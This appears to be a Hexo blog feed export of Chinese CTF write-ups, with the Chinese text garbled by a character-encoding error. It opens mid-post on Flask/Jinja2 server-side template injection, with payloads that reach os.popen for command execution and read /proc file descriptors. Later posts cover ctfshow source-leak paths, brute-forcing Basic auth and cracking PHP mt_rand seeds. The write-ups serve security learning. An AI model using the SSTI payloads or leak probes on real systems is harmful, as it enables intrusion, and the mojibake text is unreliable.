è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ<span class="keyword">import</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line"><span class="built_in">str</span>()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚</span><br><span class="line">url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtinsï¼Œè€Œä¸”url_for.<span class="built_in">globals</span>[<span class="string">&#x27;builtins&#x27;</span>]å«æœ‰current_appã€‚</span><br><span class="line">get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins**ï¼Œè€Œä¸”url_for.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>]å«æœ‰current_appã€‚</span><br><span class="line">lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–<span class="built_in">open</span>å‡½æ•°:request.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;**builtins**&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    getä¼ å‚</span><br><span class="line">request.values.x1  æ‰€æœ‰å‚æ•°</span><br><span class="line">request.cookies      cookieså‚æ•°</span><br><span class="line">request.headers      è¯·æ±‚å¤´å‚æ•°</span><br><span class="line">request.form.x1    postä¼ å‚(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)</span><br><span class="line">request.data   postä¼ å‚(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json postä¼ json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.**<span class="keyword">class</span>**.**init**.**<span class="built_in">globals</span>**[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;å¾—åˆ°&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸‰ã€å¸¸ç”¨ç±»</p><p>å…ˆä¸¾å‡ ä¸ªåŸºç¡€çš„ä¾‹å­æ–¹ä¾¿ç†è§£ï¼š<br>1ã€<strong>class</strong></p><p>__class__ç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¼å¼ä¸ºå˜é‡<code>.__**class__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">[].__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2ã€<strong>base</strong></p><p>__base__ç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œæ³¨æ„æ˜¯ç±»çš„åŸºç±»ï¼Œæ‰€ä»¥æ ¼å¼ä¸ºå˜é‡<code>.__**class__**.__**base__**</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">().<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"></span><br><span class="line">[].<span class="keyword">class</span>.__base__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>åŒæ—¶ä¹Ÿèƒ½åŠ ä¸Šæ•°ç»„ï¼Œæ¯”å¦‚å˜é‡<code>.__**class__**.__**base__**[0]</code>æ¥è·å¾—ç¬¬ä¸€ä¸ªåŸºç±»ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯è¿˜æœ‰ä¸ªç±»æ˜¯<code>__mro__</code>ï¼Œå®ƒä¼šæ˜¾ç¤ºç±»å’ŒåŸºç±»ï¼Œè¿™æ˜¯å®ƒå’Œ<code>__base__</code>çš„ä¸åŒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>3ã€<strong>subclasses</strong>()</p><p>**<code>subclasses**()</code>æŸ¥çœ‹å½“å‰ç±»çš„å­ç±»ï¼Œæ ¼å¼å˜é‡<code>.__**class__**.__**base__**[0].__**subclasses__**()</code><br>è¿™ä¸ªç±»ä¹Ÿå¯ä»¥åŠ æ•°ç»„æ¥æŸ¥çœ‹æŒ‡å®šçš„ç´¢å¼•å€¼ï¼Œä¾‹å¦‚å˜é‡<code>.__**class__**.__**bases__**[0].__**subclasses__**()[1]</code><br>åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].__subclasses__()[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å¼€å§‹åˆ©ç”¨ç±»é‡Œé¢çš„æ–¹æ³•äº†ã€‚</p><p>ç¤ºä¾‹ï¼š<code>å˜é‡.__**class__**.__**bases__**[0].__subclasses__()[138].__**init__**.__**globals__**</code>ï¼Œinitåˆå§‹åŒ–ç±»ï¼Œç„¶åglobalså…¨å±€æ¥æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•åŠå˜é‡åŠå‚æ•°ã€‚</p><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å„ç§å„æ ·çš„å‚æ•°æ–¹æ³•å‡½æ•°ï¼Œå»æ‰¾ä¸€ä¸ªå¯åˆ©ç”¨çš„functionæ¥æ‰§è¡Œï¼Œæ¯”å¦‚popençš„è¯ï¼Œå°±å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š<code>&#39;&#39;.__**class__**.__**bases__**[0].__**subclasses__**()[138].__**init__**.__**globals__[**&#39;popen&#39;].read()</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/06/26/hello-world/"/>
      <url>/2023/06/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-webå…¥é—¨-ä¿¡æ¯æ”¶é›†</title>
      <link href="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/"/>
      <url>/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-ä¿¡æ¯æ”¶é›†"><a href="#1-ä¿¡æ¯æ”¶é›†" class="headerlink" title="1.ä¿¡æ¯æ”¶é›†"></a>1.ä¿¡æ¯æ”¶é›†</h1><p>é¶åœº&#x2F;æ¥æº: ctfshow</p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a><strong>web5</strong></h1><p><strong>é¢˜ç›®ï¼š</strong></p><p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image1.png"></p><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong></p><p>æ ¹æ®æç¤ºï¼Œè¿™æ˜¯ä¸€é“phpsæºç æ³„éœ²é¢˜ï¼Œå…ˆç”¨å¾¡å‰‘æ‰«æï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æ‰«åˆ°ã€‚</p><p>ç™¾åº¦ä¸€ä¸‹phpsæºç æ³„éœ²ï¼Œå‘ç°æ³„æ¼ç‚¹åœ¨xxx.phpsï¼Œè®¿é—®&#x2F;index.phpsï¼Œå¾—åˆ°æºç ã€‚</p><p><img src="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" class="lazyload placeholder" data-srcset="/2023/01/27/1-xin-xi-shou-ji-4946418f1ae7483b853beaf9f19402e6/image2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image2.png"></p><p>è·å¾—flag</p><p><strong>çŸ¥è¯†ç‚¹ï¼šï¼ˆåŒ…æ‹¬webå…¥é—¨æ‰€æœ‰é¢˜ï¼‰</strong></p><p>ä¿¡æ¯æ”¶é›†çš„ä¸€äº›æ–‡ä»¶æ³„éœ²ï¼š</p><blockquote><p>1.robots.txtæ–‡ä»¶æ³„éœ²ï¼Œæ”¾åœ¨ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œç”¨äºé™åˆ¶æµè§ˆå™¨çš„è®¿é—®ï¼ˆå“ªäº›å¯ä»¥æŠ“å–ï¼Œå“ªäº›ä¸èƒ½æŠ“å–ï¼‰ç”¨äºé˜²æ­¢é»‘å®¢ï¼Œä½†æ˜¯ä»»ä½•äººå¯åœ¨urlä¸­ç›´æ¥é€šè¿‡&#x2F;robots.txtè®¿é—®ï¼Œå¯¼è‡´ç½‘ç«™ç»“æ„è¢«æ³„éœ²ã€‚å¯å¯¹adminç­‰é‡è¦æ–‡ä»¶è®¾ç½®å¯†ä¿ä¿æŠ¤ï¼Œæˆ–è€…é‡‡å–æ›´æ¢æ–‡ä»¶åçš„æ–¹æ³•é˜²å¾¡.</p><p>2.phpsæ–‡ä»¶æ³„éœ²ï¼Œphpså­˜æ”¾ç€phpæºç ,å¯é€šè¿‡å°è¯•è®¿é—®&#x2F;index.phpsè¯»å–,æˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–.</p><p>3..gitæ–‡ä»¶æ³„éœ²ï¼Œå½“å¼€å‘äººå‘˜ä½¿ç”¨gitæ§åˆ¶ç‰ˆæœ¬æ—¶ï¼Œå¦‚æœæ“ä½œä¸å½“ï¼Œå¯èƒ½å¯¼è‡´gitæµå…¥çº¿ä¸Šç¯å¢ƒï¼Œå¯¼è‡´.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶è¢«è®¿é—®ï¼Œä»£ç æ³„éœ²ï¼Œå¦‚.git&#x2F;indexæ–‡ä»¶å¯æ‰¾åˆ°å·¥ç¨‹æ‰€æœ‰æ–‡ä»¶åå’Œsha1æ–‡ä»¶,åœ¨git&#x2F;objectsä¸‹è½½å¯¼è‡´å±å®³</p><p>4.svnæ³„éœ²ï¼Œsvnæ˜¯æºä»£ç ç®¡ç†ç³»ç»Ÿï¼Œåœ¨ç®¡ç†ä»£ç çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.svnçš„éšè—æ–‡ä»¶ï¼Œå¯¼è‡´æºç æ³„éœ²ï¼ˆé€ æˆåŸå› æ˜¯åœ¨å‘å¸ƒä»£ç æ—¶æ²¡æœ‰ä½¿ç”¨å¯¼å…¥åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥ç²˜è´´å¤åˆ¶ï¼‰</p><p>5.vimç¼“å­˜æ³„éœ²ï¼Œåœ¨ä½¿ç”¨vimè¿›è¡Œç¼–è¾‘æ—¶ï¼Œä¼šäº§ç”Ÿç¼“å­˜æ–‡ä»¶ï¼Œæ“ä½œæ­£å¸¸ï¼Œåˆ™ä¼šåˆ é™¤ç¼“å­˜æ–‡ä»¶ï¼Œå¦‚æœæ„å¤–é€€å‡ºï¼Œç¼“å­˜æ–‡ä»¶ä¿ç•™ä¸‹æ¥ï¼Œè¿™æ˜¯æ—¶å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¥å¾—åˆ°åŸæ–‡ä»¶ï¼Œä»¥index.phpæ¥è¯´ï¼Œç¬¬ä¸€æ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º .index.php.swpï¼Œç¬¬äºŒæ¬¡é€€å‡ºåï¼Œç¼“å­˜æ–‡ä»¶åä¸º.index.php.swo,ç¬¬ä¸‰æ¬¡é€€å‡ºåæ–‡ä»¶åä¸º.index.php.swn</p><p>6.å‹ç¼©æ–‡ä»¶ä¹Ÿå¯èƒ½åŒ…å«æ–‡ä»¶çš„æºç ç­‰ï¼Œæ³¨æ„rar zipåç¼€</p><p>7.é€šè¿‡ç½‘ç«™çš„æŠ€æœ¯æ–‡æ¡£ä»€ä¹ˆçš„ï¼Œå¯ä»¥çŸ¥é“é»˜è®¤åå°è·¯å¾„åŠå¯†ç ï¼Œæ¯”å¦‚document.pdf</p><p>8.&#x2F;editor,åœ¨editorçš„flashæ¨¡å—ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ç©ºé—´ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹åˆ°æœåŠ¡å™¨çš„ç›®å½•ï¼Œé‡Œé¢å¯èƒ½æœ‰flag</p><p>9.phpæ¢é’ˆå¦‚ï¼šl.php,phpinfo.php,tz.php</p><p>10.mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ ç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ &#x2F;db&#x2F;db.mdb ä¸‹è½½æ–‡ä»¶é€šè¿‡txtæ‰“å¼€æˆ–è€…é€šè¿‡EasyAccess.exeã€‚</p></blockquote><p>æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">index.phps</span><br><span class="line">.git</span><br><span class="line">.svn</span><br><span class="line">.index.php.swp</span><br><span class="line">.index.php.swo</span><br><span class="line">.index.php.swn</span><br><span class="line">./editor</span><br><span class="line">document.pdf</span><br><span class="line">l.php</span><br><span class="line">phpinfo.php</span><br><span class="line">tz.php</span><br><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure><p>ä¿¡æ¯æ³„éœ²ç‚¹ï¼š</p><p>1.å¯ä»¥é€šè¿‡ç½‘ç«™æ³„éœ²çš„qqï¼Œæ‰‹æœºå·ç ï¼Œwxç­‰è·å¾—ä¸€äº›ä¿¡æ¯ï¼ˆåœ°ç‚¹ç­‰ï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-webå…¥é—¨-çˆ†ç ´</title>
      <link href="/2023/01/23/ctfshow-web-ru-men-bao-po/"/>
      <url>/2023/01/23/ctfshow-web-ru-men-bao-po/</url>
      
        <content type="html"><![CDATA[<p>é¶åœº&#x2F;æ¥æº: ctfshow</p><p><strong>web21</strong></p><p><strong>é¢˜ç›®ï¼š</strong></p><p>é¢˜ç›®æä¾›äº†ä¸€ä¸ªå¯†ç å­—å…¸ï¼Œä¸‹è½½å³å¯</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image1.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image1.png"></p><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong></p><p>åˆ†ææŠ“åŒ…ï¼Œå‘ç°æ ¹æ®è¾“å…¥ç™»å½•ç”¨æˆ·ä¸å¯†ç å¾—ä¸åŒï¼ŒAuthorizationéƒ½ä¸åŒï¼Œåˆ†æå…¶å€¼ MTExOjIyMg&#x3D;&#x3D; ï¼Œåˆ¤æ–­å…¶ä¸ºbase64ç¼–ç ï¼Œå¯¹å…¶è§£ç ï¼Œå¾—åˆ°åˆšæ‰111:222ï¼ˆç™»å½•è´¦æˆ·:å¯†ç ï¼‰ï¼Œä½¿ç”¨burpå¯¹å…¶è¿›è¡Œçˆ†ç ´ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image2.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image2.png"></p><p>åœ¨æœ‰æ•ˆè½½è·å¤„ç†å¤„ä½¿ç”¨å‰ç¼€åadmin:ï¼ˆçŒœæµ‹ç”¨æˆ·åä¸ºadminï¼‰,ç„¶åè¿›è¡Œbase64ç¼–ç </p><p>çˆ†ç ´æˆåŠŸï¼š</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image3.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image3.png"></p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p><p><strong>web23</strong></p><p><strong>é¢˜ç›®ï¼š</strong></p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&#39;flag.php&#39;);</code></p><p><code>if(isset($_GET[&#39;token&#39;]))&#123; #ä½¿ç”¨getè¯·æ±‚ä¼ å…¥ä¸€ä¸ªtoken</code></p><p><code>$token = md5($_GET[&#39;token&#39;]); #å¯¹tokenè¿›è¡Œmd5åŠ å¯†</code></p><p><code>#åŠ å¯†åå¾—md5è¦ç¬¦åˆä¸‹é¢ä¸€å¤§å †è§„åˆ™ï¼Œè¿˜æ˜¯ä½¿ç”¨çˆ†ç ´å§</code></p><p><code>if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</code></p><p><code>if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</code></p><p><code>echo $flag;</code></p><p><code>&#125;</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123;</code></p><p><code>highlight_file(__FILE__);</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong></p><p>æŠ“åŒ…</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image4.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image4.png"></p><p>è®¾ç½®è§„åˆ™ï¼Œä½¿ç”¨è›®åŠ›ç ´è§£ï¼ˆå› ä¸ºæ²¡æœ‰è§„åˆ™å¯ä»¥ç”¨ï¼‰</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image5.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image5.png"></p><p>æœ€åçˆ†ç ´å‡ºæ¥ä¸º3j</p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p><p><strong>web24</strong></p><p><strong>é¢˜ç›®ï¼š</strong></p><?phperror_reporting(0);include("flag.php");$r = $_GET['r']; #ä½¿ç”¨getè¯·æ±‚ä¼ å…¥ä¸€ä¸ªrmt_srand(372619038); #mt_srand(æ’­ç§å€¼)# echo mt_rand();if(intval($r)===intval(mt_rand())){echo $flag;}highlight_file(__FILE__);echo system('cat /proc/version');?><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong></p><p>å¯¹ä»£ç è¿›è¡Œå®¡è®¡ï¼Œå‘ç°mt_srand(),ç™¾åº¦å…¶ç”¨æ³•ï¼Œå‘ç°å…¶å¦‚æœè®¾ç½®äº†æ’­ç§å€¼ï¼Œmt_rand()æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°ä¼šç›¸åŒï¼ˆä¼ªéšæœºæ•°ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨echo mt_rand()å¯¹å…¶ç”Ÿæˆçš„å€¼è¿›è¡Œè¾“å‡º</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image6.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image6.png"></p><p>å¾—åˆ°å…¶ç”Ÿæˆçš„å€¼</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image7.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image7.png"></p><p>å†æ„é€ urlï¼šåœ°å€?r&#x3D;1155388967å¾—åˆ°flag</p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p><p>mt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°ã€‚ æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•°å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seedå‚æ•°ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„</p><p><strong>web25</strong></p><p><strong>é¢˜ç›®ï¼š</strong></p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&quot;flag.php&quot;);</code></p><p><code>if(isset($_GET[&#39;r&#39;]))&#123;</code></p><p><code>$r = $_GET[&#39;r&#39;];</code></p><p><code>mt_srand(hexdec(substr(md5($flag), 0,8)));</code></p><p><code>$rand = intval($r)-intval(mt_rand());</code></p><p><code>if((!$rand))&#123;</code></p><p><code>if($_COOKIE[&#39;token&#39;]==(mt_rand()+mt_rand()))&#123;</code></p><p><code>echo $flag;</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123;</code></p><p><code>echo $rand; #å¦‚æœrandä¸ç­‰äº0åˆ™è¾“å‡ºrand</code></p><p><code>&#125;</code></p><p><code>&#125;else&#123; #å¦‚æœæœªå®šä¹‰råˆ™è¾“å‡ºæ­¤æ–‡ä»¶çš„æºä»£ç </code></p><p><code>highlight_file(__FILE__);</code></p><p><code>echo system(&#39;cat /proc/version&#39;);</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p><strong>è§£é¢˜è¿‡ç¨‹ï¼š</strong></p><p>é€šè¿‡åˆ†æä»£ç ï¼Œè¿™é‡Œå¯ä»¥ä»¤rç­‰äº0ï¼Œä»è€Œæ±‚å‡ºmt_rand()çš„å€¼ï¼ˆç¬¬7è¡Œï¼‰,æ³¨æ„å»é™¤è´Ÿå·</p><p>å¾—å‡ºmt_rand()ä¸º424485486</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image8.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image8.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è§£å†³tokené—®é¢˜ï¼Œè¿™é‡Œéœ€è¦å¯¹åˆ©ç”¨ç”Ÿæˆçš„éšæœºæ•°å¯¹ç§å­è¿›è¡Œç ´è§£</p><p>#ä½¿ç”¨php_mt_seed4.0 æˆ‘ä»¬åœ¨linuxä¸‹é¢ä½¿ç”¨gccç¼–è¯‘</p><p>gcc php_mt_seed.c -o php_mt_seed</p><p>#ä¹‹åè¿è¡Œè„šæœ¬æ·»åŠ éšæœºæ•°</p><p>.&#x2F;php_mt_seed 424485486</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image9.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 